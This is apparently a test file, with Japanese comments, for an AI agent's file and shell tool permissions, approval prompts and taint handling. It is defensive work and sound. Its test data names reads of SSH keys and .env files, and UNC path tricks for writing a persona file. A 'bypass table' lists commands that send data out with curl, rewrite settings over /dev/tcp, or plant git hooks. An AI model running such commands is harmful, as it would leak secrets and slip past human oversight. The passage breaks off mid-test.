import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { basename, delimiter, join } from 'node:path';
import { test } from 'node:test';
import { Type } from '@sinclair/typebox';
import type { AppConfig } from '../src/config/schema.ts';
import { parseConfig } from '../src/config/store.ts';
import { openDatabase } from '../src/db/database.ts';
import { MIGRATIONS } from '../src/db/migrations.ts';
import type { RunEvent } from '../src/engine/types.ts';
import { resolvePaths, type AppPaths } from '../src/paths.ts';
import { ApprovalBroker, approvalPublic, inputHash } from '../src/tools/approvals.ts';
import { fileEdit, fileList, fileRead, fileWrite } from '../src/tools/builtin/files.ts';
import { shellRun } from '../src/tools/builtin/shell.ts';
import { runToolCall } from '../src/tools/pipeline.ts';
import { buildPolicy, defaultWorkspace } from '../src/tools/policy.ts';
import { ToolRegistry } from '../src/tools/registry.ts';
import { findExecutable, resolveShell, runProcess, scrubEnv } from '../src/tools/shell/runner.ts';
import type { ExecuteInfo, ToolContext, ToolDef } from '../src/tools/types.ts';
import { tempDir, testConfig } from './helpers.ts';

function setup(t: { after: (fn: () => void) => void }, mutate: (c: AppConfig) => void = () => undefined) {
  const paths: AppPaths = resolvePaths(tempDir(t));
  mkdirSync(paths.workspace, { recursive: true });
  mkdirSync(join(paths.data, 'reference'), { recursive: true });
  writeFileSync(join(paths.data, 'reference', 'doc.md'), '参照用の文書');
  const config = testConfig();
  config.tools.roots = [{ path: 'workspace', mode: 'write' }, { path: 'reference', mode: 'read' }];
  mutate(config);
  const parsed = parseConfig(config);
  const db = openDatabase(':memory:', MIGRATIONS);
  const events: RunEvent[] = [];
  const approvals = new ApprovalBroker(db, e => events.push(e.type === 'requested'
    ? { type: 'approval.requested', runId: e.view.runId, conversationId: e.view.conversationId, approval: approvalPublic(e.view) }
    : { type: 'approval.resolved', runId: e.view.runId, conversationId: e.view.conversationId, approvalId: e.view.id, outcome: e.outcome }));
  const registry = new ToolRegistry().register(fileRead).register(fileWrite).register(fileEdit).register(fileList).register(shellRun);
  const policy = buildPolicy(parsed, paths);
  const controller = new AbortController();
  const ctx: ToolContext = {
    runId: 'r1', conversationId: 'c1', kind: 'chat', signal: controller.signal, config: parsed, paths, policy,
    workspace: defaultWorkspace(policy, paths), taint: { tainted: false, sources: [] }, log: () => undefined,
  };
  const call = (name: string, args: unknown, c: ToolContext = ctx) =>
    runToolCall({ id: `call-${Math.random()}`, name, arguments: args }, c, { registry, approvals, db, emit: e => events.push(e), conversationAutoRead: () => false });
  return { paths, ctx, call, approvals, events, db, controller };
}

async function decideNext(s: ReturnType<typeof setup>, decision: 'once' | 'conversation' | 'deny') {
  for (let i = 0; i < 200 && !s.approvals.pending().length; i++) await new Promise(r => setTimeout(r, 10));
  const pending = s.approvals.pending()[0];
  assert.ok(pending, '承認の依頼が来ていない');
  s.approvals.decide(pending.id, decision);
  return pending;
}

// ── ファイルツール ────────────────────────────────────────

test('ファイル: 作業フォルダの中は読み書きできる', async t => {
  const s = setup(t);
  assert.equal((await s.call('file_write', { path: 'notes/a.md', content: 'こんにちは\n二行目' })).output.isError, undefined);
  assert.equal(readFileSync(join(s.paths.workspace, 'notes', 'a.md'), 'utf8'), 'こんにちは\n二行目');
  assert.match((await s.call('file_read', { path: 'notes/a.md', offset: 2 })).output.content, /^二行目/u);
  assert.match((await s.call('file_edit', { path: 'notes/a.md', old: '二行目', new: '2行目' })).output.content, /1 か所/u);
  assert.match((await s.call('file_list', { depth: 2 })).output.content, /notes\/[\s\S]*a\.md/u);
  assert.match((await s.call('file_read', { path: join(s.paths.data, 'reference', 'doc.md') })).output.content, /参照用/u);
});

test('ファイル: 外・秘密情報・読み取り専用・保護対象は実行しない', async t => {
  const s = setup(t);
  const cases: Array<[string, unknown]> = [
    ['file_write', { path: '../outside.txt', content: 'x' }],
    ['file_write', { path: '.env', content: 'KEY=1' }],
    ['file_write', { path: join(s.paths.data, 'reference', 'doc.md'), content: 'x' }],
    ['file_read', { path: s.paths.config }],
    ['file_read', { path: s.paths.database }],
    ['file_read', { path: '~/.ssh/id_rsa' }],
  ];
  for (const [name, args] of cases) {
    const outcome = await s.call(name, args);
    assert.equal(outcome.decision, 'deny', JSON.stringify(args));
    assert.match(outcome.output.content, /実行しませんでした/u);
  }
  assert.equal(existsSync(join(s.paths.data, 'outside.txt')), false);
  assert.equal(readFileSync(join(s.paths.data, 'reference', 'doc.md'), 'utf8'), '参照用の文書');
});

// 再審査の指摘: `//localhost/D$/…/USER.md`（管理共有）や `//?/D:/…`（デバイスのパス）は、本物の Windows で作業フォルダの中のファイルを指すのに、許可フォルダの外のふつうの確かめだけで通った
test('ファイル: UNC・デバイスのパス（管理共有・//?/・\\??\\）は、どの書き方でも、読む・書く・設定を指すときも止める', { skip: process.platform !== 'win32' && 'Windows のパスの決まりだけの確かめ' }, async t => {
  const s = setup(t);
  const ws = s.paths.workspace;
  const fwd = (p: string): string => p.replaceAll('\\', '/');
  writeFileSync(join(ws, 'USER.md'), 'user');
  const share = (p: string): string => `//localhost/${p.slice(0, 1)}$${fwd(p).slice(2)}`;
  for (const path of [`${share(ws)}/USER.md`, `//?/${fwd(ws)}/USER.md`, `\\\\?\\${ws}\\USER.md`, `//./${fwd(ws)}/USER.md`, `\\??\\${ws}\\USER.md`, `//server/share/USER.md`]) {
    const write = await s.call('file_write', { path, content: 'pwned' });
    assert.equal(write.decision, 'deny', path);
    const read = await s.call('file_read', { path });
    assert.equal(read.decision, 'deny', path);
  }
  assert.equal(readFileSync(join(ws, 'USER.md'), 'utf8'), 'user', '管理共有ごしに人格が書き換わった');
  for (const path of [`//?/${fwd(s.paths.config)}`, `${share(s.paths.config)}`, `//?/${fwd(s.paths.database)}`]) assert.equal((await s.call('file_read', { path })).decision, 'deny', `${path}: 設定・データベースは止める（ふつうの確かめに下がらない）`);
});

test('ファイル: 作業フォルダの中から外を指すシンボリックリンクには書き込まない', async t => {
  const s = setup(t);
  const target = join(s.paths.data, 'outside-dir');
  mkdirSync(target);
  try { symlinkSync(target, join(s.paths.workspace, 'link'), 'junction'); } catch { t.skip('シンボリックリンクを作れない環境'); return; }
  const outcome = await s.call('file_write', { path: 'link/x.txt', content: 'x' });
  assert.equal(outcome.decision, 'deny');
  assert.equal(existsSync(join(target, 'x.txt')), false);
});

test('引数の形が正しくなければ、実行せずに直させる', async t => {
  const s = setup(t);
  const bad = await s.call('file_write', { path: 'a.md' });
  assert.equal(bad.invalidArguments, true);
  assert.match(bad.output.content, /引数の形が正しくありません/u);
  const unknown = await s.call('nope', {});
  assert.equal(unknown.invalidArguments, true);
  assert.match(unknown.output.content, /使えるツール/u);
});

// ── シェルと承認 ──────────────────────────────────────────

test('シェル: 作業フォルダの中のコマンドは承認なしで実行する', async t => {
  const s = setup(t);
  const outcome = await s.call('shell_run', { command: 'echo hello-clive' });
  assert.equal(outcome.decision, 'allow');
  assert.match(outcome.output.content, /hello-clive/u);
  assert.match(outcome.output.content, /終了コード: 0/u);
});

test('シェル: 秘密情報の読み取りは実行しない', async t => {
  const s = setup(t);
  writeFileSync(join(s.paths.workspace, '.env'), 'SECRET=xyz');
  const outcome = await s.call('shell_run', { command: 'cat .env' });
  assert.equal(outcome.decision, 'deny');
  assert.doesNotMatch(outcome.output.content, /xyz/u);
});

test('承認: 今回だけ許可すると1回だけ実行し、拒否なら実行しない', async t => {
  const s = setup(t);
  const outsideFile = join(s.paths.data, 'outside.txt');
  writeFileSync(outsideFile, 'outside-content');
  const command = process.platform === 'win32' ? `Get-Content "${outsideFile}"` : `cat "${outsideFile}"`;
  const pending = s.call('shell_run', { command });
  const request = await decideNext(s, 'once');
  assert.match(request.reasons.join(), /許可フォルダの外/u);
  assert.match(request.body, /outside\.txt/u);
  const approved = await pending;
  assert.equal(approved.decidedBy, 'user');
  assert.match(approved.output.content, /outside-content/u);

  const second = s.call('shell_run', { command });
  await decideNext(s, 'deny');
  const denied = await second;
  assert.match(denied.output.content, /拒否しました/u);
  const rows = s.db.prepare("SELECT status FROM approvals ORDER BY created_at").all() as Array<{ status: string }>;
  assert.deepEqual(rows.map(r => r.status), ['approved', 'denied']);
});

test('承認: 「この会話では許可」なら同じ入力は聞き直さない。中止したら実行しない', async t => {
  const s = setup(t, c => { c.tools.shell.ask = ['echo needs-approval']; });
  const command = 'echo needs-approval';
  const first = s.call('shell_run', { command });
  await decideNext(s, 'conversation');
  await first;
  const second = await s.call('shell_run', { command });
  assert.equal(second.decidedBy, 'conversation-grant');

  const third = s.call('shell_run', { command: 'git push origin main' });
  for (let i = 0; i < 200 && !s.approvals.pending().length; i++) await new Promise(r => setTimeout(r, 10));
  s.controller.abort();
  const cancelled = await third;
  assert.match(cancelled.output.content, /中止/u);
});

async function waitPending(s: ReturnType<typeof setup>) {
  for (let i = 0; i < 300 && !s.approvals.pending().length; i++) await new Promise(r => setTimeout(r, 10));
  const pending = s.approvals.pending()[0];
  assert.ok(pending, '承認の依頼が来ていない');
  return pending;
}

test('V6: コードを動かす確かめは今回だけ。「この会話では許可」を送られても、前に会話の許可があっても、また確かめる', async t => {
  const s = setup(t);
  writeFileSync(join(s.paths.workspace, 'put.js'), "console.log('first');\n");
  const command = 'node put.js';
  const hash = inputHash('shell_run', { command });

  const first = s.call('shell_run', { command });
  const request = await decideNext(s, 'conversation');
  assert.equal(request.onceOnly, true);
  assert.deepEqual(request.preview?.map(p => [basename(p.path), p.text, p.truncated]), [['put.js', "console.log('first');\n", false]]);
  const ran = await first;
  assert.equal(ran.decidedBy, 'user');
  assert.match(ran.output.content, /first/u);
  assert.equal(s.approvals.isGranted('c1', hash), false, '会話の許可に足されている');
  assert.deepEqual((s.db.prepare('SELECT scope FROM approvals').all() as Array<{ scope: string }>).map(r => r.scope), ['once'], '記録も今回だけ');

  const second = s.call('shell_run', { command });
  const asked = await decideNext(s, 'deny');
  assert.equal(asked.onceOnly, true);
  assert.match((await second).output.content, /拒否しました/u);

  // 前に同じ文字のコマンドを「この会話では許可」にしていても（コードを動かす確かめではなかった頃の許可など）、中身が違いうるのでまた確かめる
  const grant = s.approvals.request({ runId: 'r0', conversationId: 'c1', tool: 'shell_run', input: { command }, title: '', body: command, reasons: [], details: [] }, 60_000, new AbortController().signal);
  s.approvals.decide(s.approvals.pending()[0]!.id, 'conversation');
  await grant;
  assert.equal(s.approvals.isGranted('c1', hash), true, '前提: 会話の許可がある');
  const third = s.call('shell_run', { command });
  const again = await decideNext(s, 'deny');
  assert.equal(again.onceOnly, true);
  assert.equal((await third).decidedBy, 'user', '会話の許可で通ってしまう');
});

test('V6: コードを動かさない確かめ（外への送信など）は、これまでどおり「この会話では許可」で済ませられる', async t => {
  const s = setup(t, c => { c.tools.shell.ask = ['echo needs-approval']; });
  const first = s.call('shell_run', { command: 'echo needs-approval' });
  const request = await decideNext(s, 'conversation');
  assert.equal(request.onceOnly, false);
  assert.deepEqual(request.preview, undefined);
  await first;
  assert.equal((await s.call('shell_run', { command: 'echo needs-approval' })).decidedBy, 'conversation-grant');
});

test('V7: 確かめの札を出したあとでファイルの中身が書き換わったら、許可されても動かさない', async t => {
  const s = setup(t);
  const file = join(s.paths.workspace, 'put.js');
  const marker = join(s.paths.workspace, 'ran.txt');
  const code = (word: string) => `require('node:fs').writeFileSync('ran.txt', '${word}');\n`;

  writeFileSync(file, code('safe'));
  const swapped = s.call('shell_run', { command: 'node put.js' });
  const pending = await waitPending(s);
  writeFileSync(file, code('evil'));
  s.approvals.decide(pending.id, 'once');
  const outcome = await swapped;
  assert.equal(outcome.output.isError, true);
  assert.match(outcome.output.content, /中身が変わった/u);
  assert.equal(outcome.decision, 'deny');
  assert.equal(outcome.decidedBy, 'recheck');
  assert.equal(existsSync(marker), false, '書き換えられたコードが動いた');

  const removed = s.call('shell_run', { command: 'node put.js' });
  const pendingRemoved = await waitPending(s);
  rmSync(file);
  s.approvals.decide(pendingRemoved.id, 'once');
  assert.match((await removed).output.content, /中身が変わった/u, 'ファイルが消えても同じ');

  // 対照: 書き換えなければ、許可どおり動く
  writeFileSync(file, code('safe'));
  const kept = s.call('shell_run', { command: 'node put.js' });
  await decideNext(s, 'once');
  const ok = await kept;
  assert.equal(ok.decidedBy, 'user');
  assert.equal(readFileSync(marker, 'utf8'), 'safe');
});

test('V7: 許可のあとで判定が deny になったら（設定が変わるなど）、動かさない', async t => {
  const s = setup(t);
  writeFileSync(join(s.paths.workspace, 'put.js'), "require('node:fs').writeFileSync('ran.txt', 'x');\n");
  const pending = s.call('shell_run', { command: 'node put.js' });
  const request = await waitPending(s);
  s.ctx.config.tools.shell.deny = ['node'];
  s.approvals.decide(request.id, 'once');
  const outcome = await pending;
  assert.equal(outcome.decision, 'deny');
  assert.match(outcome.output.content, /実行しませんでした（拒否）/u);
  assert.equal(existsSync(join(s.paths.workspace, 'ran.txt')), false);
});

// 審査の指摘（深い審査）: 洗い出した git は、フックを必ず空にしていたので、持ち主が許したコマンドでも pre-commit が動かなかった。
// 実行する道具には、持ち主が「今回だけ」の確かめを許した呼び出しかどうかを、呼び出しごとに渡す
test('V8: 道具には、持ち主が「今回だけ」の確かめを許した呼び出しだけ、許したと渡す。確かめなし・ふつうの確かめ・会話の許可・拒否では渡さない', async t => {
  const s = setup(t);
  const seen: Array<ExecuteInfo | undefined> = [];
  const probe: ToolDef<{ mode: 'allow' | 'ask' | 'once' }> = {
    name: 'probe', description: 'x', input: Type.Object({ mode: Type.String() }), effect: 'read', allowedIn: ['chat', 'task'],
    preCheck: input => (input.mode === 'once'
      ? { decision: 'ask', reasons: ['code'], onceOnly: true, askKinds: ['code'] }
      : { decision: input.mode, reasons: input.mode === 'ask' ? ['ask'] : [] }),
    execute: async (_input, _ctx, info) => { seen.push(info); return { content: 'ok' }; },
  };
  const registry = new ToolRegistry().register(probe);
  const call = (mode: string) => runToolCall({ id: 'p', name: 'probe', arguments: { mode } }, s.ctx, { registry, approvals: s.approvals, db: s.db, emit: () => undefined, conversationAutoRead: () => false });

  await call('allow');
  const plain = call('ask');
  await decideNext(s, 'once');
  await plain;
  const conversation = call('ask');
  await decideNext(s, 'conversation');
  await conversation;
  assert.equal((await call('ask')).decidedBy, 'conversation-grant');
  assert.deepEqual(seen.map(i => i?.approvedOnce), [false, false, false, false]);
  assert.deepEqual(seen.map(i => i?.check), [undefined, undefined, undefined, undefined], '許していない呼び出しに、事前の判定は渡さない');

  seen.length = 0;
  const once = call('once');
  await decideNext(s, 'once');
  await once;
  assert.deepEqual(seen.map(i => i?.approvedOnce), [true]);
  assert.deepEqual(seen[0]?.check, { decision: 'ask', reasons: ['code'], onceOnly: true, askKinds: ['code'] }, '持ち主に見せた事前の判定を渡す');

  seen.length = 0;
  const denied = call('once');
  await decideNext(s, 'deny');
  await denied;
  assert.deepEqual(seen, [], '拒否したのに実行された');
});

test('V6: 裏で動くタスクも、コードを動かす前は人の許可を待つ。時間が過ぎたら動かさない', async t => {
  const s = setup(t);
  writeFileSync(join(s.paths.workspace, 'put.js'), "require('node:fs').writeFileSync('ran.txt', 'ran');\n");
  s.ctx.config.tools.shell.approvalTimeoutSec = 1;
  const outcome = await s.call('shell_run', { command: 'node put.js' }, { ...s.ctx, kind: 'task', conversationId: 'task-conv' });
  assert.equal(outcome.decision, 'ask');
  assert.equal(outcome.decidedBy, 'user');
  assert.match(outcome.output.content, /承認の待ち時間が過ぎたため実行しませんでした/u);
  assert.equal(existsSync(join(s.paths.workspace, 'ran.txt')), false);
  const requested = s.events.filter(e => e.type === 'approval.requested');
  assert.equal(requested.length, 1);
  assert.equal(requested[0]!.conversationId, 'task-conv');
  assert.deepEqual((s.db.prepare('SELECT status FROM approvals').all() as Array<{ status: string }>).map(r => r.status), ['expired']);
});

test('V5: スキルのフォルダと .git への書き込みは、シェルなしの file_write・file_edit でも確かめになる（理由は場所ごと）', async t => {
  const s = setup(t);
  mkdirSync(join(s.paths.workspace, 'skills', 'ok'), { recursive: true });
  writeFileSync(join(s.paths.workspace, 'skills', 'ok', 'SKILL.md'), 'old');
  mkdirSync(join(s.paths.workspace, 'proj', '.git', 'hooks'), { recursive: true });
  writeFileSync(join(s.paths.workspace, 'proj', '.git', 'config'), '[core]');
  // .git でない名前の裏のリポジトリ（HEAD・objects/・refs/ がある）も、同じ
  for (const d of ['hooks', 'objects', 'refs']) mkdirSync(join(s.paths.workspace, 'up', d), { recursive: true });
  writeFileSync(join(s.paths.workspace, 'up', 'HEAD'), 'ref: refs/heads/main\n');
  const cases: Array<[string, RegExp]> = [
    ['skills/evil/SKILL.md', /スキルのフォルダ/u],
    ['skills/ok/extra.md', /スキルのフォルダ/u],
    ['.git/hooks/pre-commit', /git のフォルダ/u],
    ['proj/.git/hooks/post-checkout', /git のフォルダ/u],
    ['up/hooks/pre-receive', /git のフォルダ/u],
    ['up/config', /git のフォルダ/u],
  ];
  if (process.platform === 'win32') cases.push(['proj/.GIT/config', /git のフォルダ/u]);
  for (const [path, reason] of cases) {
    const pending = s.call('file_write', { path, content: 'x' });
    const request = await decideNext(s, 'deny');
    assert.match(request.reasons.join(), reason, path);
    // .git はフックや設定というコードを書くことになるので会話の許可を越えて毎回確かめる。スキルは中身が引数にあるので、これまでの承認と同じ
    assert.equal(request.onceOnly, /\.git|^up\//iu.test(path), path);
    assert.match((await pending).output.content, /拒否しました/u, path);
    assert.equal(existsSync(join(s.paths.workspace, path)) && readFileSync(join(s.paths.workspace, path), 'utf8') === 'x', false, `${path} に書かれてしまった`);
  }

  const edit = s.call('file_edit', { path: 'skills/ok/SKILL.md', old: 'old', new: 'new' });
  assert.match((await decideNext(s, 'deny')).reasons.join(), /スキルのフォルダ/u);
  await edit;
  assert.equal(readFileSync(join(s.paths.workspace, 'skills', 'ok', 'SKILL.md'), 'utf8'), 'old');

  // 許可すれば書ける（人が確かめたあと）
  const approved = s.call('file_write', { path: 'skills/evil/SKILL.md', content: 'x' });
  await decideNext(s, 'once');
  await approved;
  assert.equal(readFileSync(join(s.paths.workspace, 'skills', 'evil', 'SKILL.md'), 'utf8'), 'x');

  // ふつうのファイル・読むこと・似た名前は、今までどおり確かめなし
  for (const path of ['notes/a.md', 'skills.md', 'my-skills/a.md', 'gitnotes/.github/a.md', '.gitignore']) {
    const outcome = await s.call('file_write', { path, content: 'x' });
    assert.equal(outcome.decision, 'allow', path);
  }
  assert.equal((await s.call('file_read', { path: 'skills/ok/SKILL.md' })).decision, 'allow');
  assert.equal((await s.call('file_read', { path: 'proj/.git/config' })).decision, 'allow');
  assert.equal((await s.call('file_list', { path: 'skills' })).decision, 'allow');
});

// 審査の指摘: PATH の空・'.'・相対の項目は、シェルでは「いまいる場所」（cd のあとはその先）を指す。許可の一覧は最初の場所で実体を調べるので、cd で動いた先に置いたものを見逃していた
test('scrubEnv: 子の PATH から、空・.・相対の項目を除く。絶対パスの項目は順序のまま残す', () => {
  const win = process.platform === 'win32';
  const abs = win ? ['C:\\Windows\\system32', 'C:\\Program Files\\Git\\cmd', '\\\\server\\share\\bin'] : ['/usr/bin', '/opt/my bin', '/usr/local/bin'];
  const raw = ['', '.', 'bin', `.${win ? '\\' : '/'}bin`, '..', abs[0], '~/bin', win ? 'C:rel' : 'a/b', abs[1], '', abs[2], '..\\x'].join(delimiter);
  const want = abs.join(delimiter);
  assert.equal(scrubEnv([], { PATH: raw, HOME: '/h', USERPROFILE: 'C:\\Users\\u' }).PATH, want);
  assert.equal(scrubEnv([], { PATH: raw, HOME: '/h' }).HOME, '/h', '別の変数はそのまま');
  if (win) {
    assert.equal(scrubEnv([], { Path: raw }).Path, want, 'Windows の Path');
    assert.equal(scrubEnv([], { PATH: `"${abs[1]}"${delimiter}"rel"` }).PATH, abs[1], '引用符つきの絶対パスは引用符を外して残し、相対は除く');
  }
  assert.equal(scrubEnv([], { PATH: '.' }).PATH, '');
  assert.equal(scrubEnv([], { PATH: '' }).PATH, '');
});

test('findExecutable: PATH の . から、いまいる場所の実行ファイルを見つけない（scrubEnv を通したあと）', t => {
  const dir = tempDir(t);
  const name = process.platform === 'win32' ? 'tool.exe' : 'tool';
  writeFileSync(join(dir, name), '', { mode: 0o755 });
  const raw = `.${delimiter}${delimiter}rel${delimiter}${process.platform === 'win32' ? 'C:\\Windows\\system32' : '/usr/bin'}`;
  assert.equal(findExecutable('tool', { PATH: raw }, dir) !== undefined, true, '前提: そのままの PATH だと、いまいる場所の実行ファイルが見つかる');
  assert.equal(findExecutable('tool', scrubEnv([], { PATH: raw }), dir), undefined);
});

test('V5: シェルでも、スキルのフォルダと .git への書き込み・読むだけでないコマンドは確かめになる。読むだけは通す', async t => {
  const s = setup(t);
  mkdirSync(join(s.paths.workspace, 'skills'), { recursive: true });
  const asks: Array<[string, RegExp]> = [
    ['echo x > skills/a/SKILL.md', /スキルのフォルダに書き込みます/u],
    [process.platform === 'win32' ? 'Set-Content -Path .git/config -Value x' : 'echo x > .git/config', /git のフォルダ（.git）に書き込みます/u],
    ['cp notes.md skills/a/SKILL.md', /スキルのフォルダ/u],
    ['git clone https://example.com/x.git skills/x', /git の clone/u],
    ['python tool.py .git/hooks/pre-commit', /python/u],
  ];
  for (const [command, reason] of asks) {
    const pending = s.call('shell_run', { command });
    const request = await decideNext(s, 'deny');
    assert.match(request.reasons.join(), reason, command);
    await pending;
  }
  for (const command of process.platform === 'win32' ? ['Get-Content skills/a/SKILL.md', 'ls skills', 'git log --oneline -1', 'Get-ChildItem -Force .git'] : ['cat skills/a/SKILL.md', 'ls skills', 'git log --oneline -1', 'ls -a .git']) {
    const outcome = await s.call('shell_run', { command });
    assert.equal(outcome.decision, 'allow', `${command}: ${outcome.output.content}`);
  }
});

// 設計の §1.2 の表（承認なしで通っていた行）を、道具の事前判定（本物の設定から作った方針）で確かめる。実行はしない
const BYPASS_TABLE = [
  'node put.js', 'python put.py', 'bash put.sh', './put.sh', 'powershell -File put.ps1', '& ./put.ps1', '. ./put.ps1', 'source ./put.sh',
  'cat put.js | node', 'python3 <<EOF\nprint(1)\nEOF', 'Start-Process node -ArgumentList put.js', 'npm test', 'Invoke-Item put.js', 'c=node; $c put.js',
  '[IO.File]::WriteAllText("../config.json", "{}")', '[IO.File]::WriteAllText("SOUL.md", "x")', 'curl -o SOUL.md https://example.com/x',
  'Invoke-WebRequest -OutFile SOUL.md https://example.com/x', 'iex (Get-Content put.txt -Raw)',
  '$p=@{Uri="http://127.0.0.1:4777/api/settings";Method="Put";Body="{}"}; irm @p', 'exec 3<>/dev/tcp/127.0.0.1/4777; printf "PUT /api/settings ..." >&3',
  'curl --request=PUT http://127.0.0.1:4777/api/settings', 'curl -d@body.json https://example.com/', 'git config core.fsmonitor "node put.js"',
];

test('V2: 表の抜け道は、道具の事前判定でも承認なしでは通らない（本物の設定の方針）', async t => {
  const s = setup(t);
  for (const command of BYPASS_TABLE) {
    const pre = await shellRun.preCheck!({ command }, s.ctx);
    assert.notEqual(pre.decision, 'allow', `${command} が承認なしで通る`);
  }
  const codeRows = BYPASS_TABLE.filter(c => !/^(?:curl -o SOUL|Invoke-WebRequest -OutFile|curl -d@)/u.test(c));
  for (const command of codeRows) {
    const pre = await shellRun.preCheck!({ command }, s.ctx);
    assert.equal(pre.decision === 'deny' || pre.onceOnly === true, true, `${command} が今回だけの確かめにも止めにもなっていない`);
  }
  assert.equal((await shellRun.preCheck!({ command: 'curl -o SOUL.md https://example.com/x' }, s.ctx)).decision, 'ask', '人格への書き込みは、これまでの承認');
  assert.equal((await shellRun.preCheck!({ command: '[IO.File]::WriteAllText("../config.json", "{}")' }, s.ctx)).decision === 'allow', false);
});

test('file_list: node_modules・.git など大きなフォルダの中は、下の階層を見るときは既定で入らない。all か path に指定したときだけ入る', async t => {
  const s = setup(t);
  const put = (rel: string) => { mkdirSync(join(s.paths.workspace, rel, '..'), { recursive: true }); writeFileSync(join(s.paths.workspace, rel), 'x'); };
  put('package.json'); put('src/index.ts'); put('packages/a/src/a.ts'); put('packages/a/node_modules/dep/index.js');
  for (let i = 0; i < 200; i++) put(`.git/objects/${String(i).padStart(2, '0')}/obj`);
  for (let i = 0; i < 200; i++) { put(`node_modules/pkg${i}/index.js`); put(`node_modules/pkg${i}/package.json`); }

  const out = (await s.call('file_list', { depth: 4 })).output.content;
  assert.match(out, /\npackage\.json\n/u, '本当に見たいものが、500 件の枠に入る');
  assert.match(out, /\n {2}index\.ts\n/u, 'src の中も出る');
  assert.match(out, /\n\.git\/ （中は省略）\n/u);
  assert.match(out, /\nnode_modules\/ （中は省略）\n/u);
  assert.match(out, / {2}node_modules\/ （中は省略）/u, '深いところの node_modules も入らない');
  assert.doesNotMatch(out, /pkg0|dep\/|objects/u);
  assert.match(out, /\[\.git\/, node_modules\/ の中は一覧していません/u);
  assert.doesNotMatch(out, /500 件で打ち切り/u);

  const shallow = (await s.call('file_list', {})).output.content;
  assert.doesNotMatch(shallow, /中は省略|一覧していません/u, '1 階層だけ見るときは、これまでどおり（中に入らないので注記もいらない）');
  assert.match(shallow, /\nnode_modules\/\n/u);

  const inside = (await s.call('file_list', { path: 'node_modules', depth: 2 })).output.content;
  assert.match(inside, /pkg0\/\n {2}index\.js/u, 'path に指定すれば、そのフォルダの中を一覧する');
  assert.doesNotMatch(inside, /中は省略/u);

  const all = (await s.call('file_list', { depth: 3, all: true })).output.content;
  assert.match(all, /objects\//u, 'all なら中も入る');
  assert.doesNotMatch(all, /中は省略|一覧していません/u);
  assert.match(all, /500 件で打ち切り/u, '入ると、枠を使い切る');
});

test('taint: Web や添付の内容を読んだ後は、書き込みも承認制になる', async t => {
  const s = setup(t);
  const ctx = { ...s.ctx, taint: { tainted: true, sources: ['web_fetch'] } };
  const pending = s.call('file_write', { path: 'a.md', content: 'x' }, ctx);
  const request = await decideNext(s, 'deny');
  assert.match(request.reasons.join(), /よそから来た文/u);
  assert.equal((await pending).output.isError, true);
});

// ── ユーザー定義のフック ─────────────────────────────────

test('フック: exit 2 で拒否、JSON で ask、タイムアウトは止める側に倒す。組み込みの拒否は緩められない', async t => {
  const dir = tempDir(t);
  const script = (name: string, body: string) => { const p = join(dir, name); writeFileSync(p, body); return p; };
  const deny = script('deny.mjs', `let s='';process.stdin.on('data',d=>s+=d).on('end',()=>{const p=JSON.parse(s);if(p.tool_input.command.includes('forbidden')){process.stderr.write('禁止ワードです');process.exit(2)}process.exit(0)})`);
  const ask = script('ask.mjs', `process.stdin.resume();process.stdin.on('end',()=>{process.stdout.write(JSON.stringify({hookSpecificOutput:{permissionDecision:'ask',permissionDecisionReason:'念のため確認'}}))})`);
  const allow = script('allow.mjs', `process.stdin.resume();process.stdin.on('end',()=>{process.stdout.write('{"decision":"allow"}')})`);
  const slow = script('slow.mjs', `setTimeout(()=>{},10000)`);
  const s = setup(t, c => {
    c.tools.hooks.preToolUse = [
      { matcher: 'shell_run', command: [process.execPath, deny], timeoutMs: 10_000, onError: 'deny' },
      { matcher: 'file_write', command: [process.execPath, ask], timeoutMs: 10_000, onError: 'deny' },
      { matcher: 'file_read', command: [process.execPath, slow], timeoutMs: 300, onError: 'deny' },
      { matcher: 'file_.*', command: [process.execPath, allow], timeoutMs: 10_000, onError: 'deny' },
    ];
  });
  const denied = await s.call('shell_run', { command: 'echo forbidden' });
  assert.equal(denied.decision, 'deny');
  assert.match(denied.output.content, /禁止ワード/u);
  assert.equal((await s.call('shell_run', { command: 'echo fine' })).decision, 'allow');

  const asking = s.call('file_write', { path: 'x.md', content: 'x' });
  const request = await decideNext(s, 'once');
  assert.match(request.reasons.join(), /念のため確認/u);
  assert.equal((await asking).decision, 'ask');

  const timedOut = await s.call('file_read', { path: 'x.md' });
  assert.equal(timedOut.decision, 'deny');
  assert.match(timedOut.output.content, /タイムアウト/u);

  const stillDenied = await s.call('file_write', { path: '.env', content: 'x' });
  assert.equal(stillDenied.decision, 'deny', 'allow を返すフックがあっても組み込みの拒否は変わらない');
});

// ── 子プロセス ────────────────────────────────────────────

test('子プロセス: API キーやトークンは環境変数から外す', async t => {
  const env = scrubEnv(['MY_SETTING', 'MY_API_KEY'], { PATH: process.env.PATH ?? '', MY_SETTING: 'ok', MY_API_KEY: 'secret', ANTHROPIC_API_KEY: 'secret', GITHUB_TOKEN: 'secret' });
  assert.equal(env.MY_SETTING, 'ok');
  assert.equal(env.MY_API_KEY, undefined, '許可リストにあってもキーは渡さない');
  assert.equal(env.ANTHROPIC_API_KEY, undefined);
  assert.equal(env.GITHUB_TOKEN, undefined);
  const result = await runProcess(process.execPath, ['-e', 'console.log(process.env.ANTHROPIC_API_KEY ?? "none")'], {
    cwd: tempDir(t), env: scrubEnv(), timeoutMs: 10_000, signal: new AbortController().signal, maxBytes: 1024,
  });
  assert.equal(result.stdout.trim(), 'none');
});

test('子プロセス: タイムアウトしたら孫プロセスまで止める', async t => {
  const dir = tempDir(t);
  const marker = join(dir, 'grandchild-survived.txt');
  const grandchild = `setTimeout(()=>require('fs').writeFileSync(${JSON.stringify(marker)},'x'),1500)`;
  const parent = `require('child_process').spawn(process.execPath,['-e',${JSON.stringify(grandchild)}],{stdio:'ignore'});setTimeout(()=>{},10000)`;
  const started = Date.now();
  const result = await runProcess(process.execPath, ['-e', parent], { cwd: dir, env: scrubEnv(), timeoutMs: 400, signal: new AbortController().signal, maxBytes: 1024 });
  assert.equal(result.timedOut, true);
  assert.ok(Date.now() - started < 5000);
  await new Promise(r => setTimeout(r, 2000));
  assert.equal(existsSync(marker), false, '孫プロセスが生き残っている');
});

test('子プロセス: 出力が上限を超えたら全文をファイルに残す', async t => {
  const dir = tempDir(t);
  const result = await runProcess(process.execPath, ['-e', 'process.stdout.write("x".repeat(5000))'], {
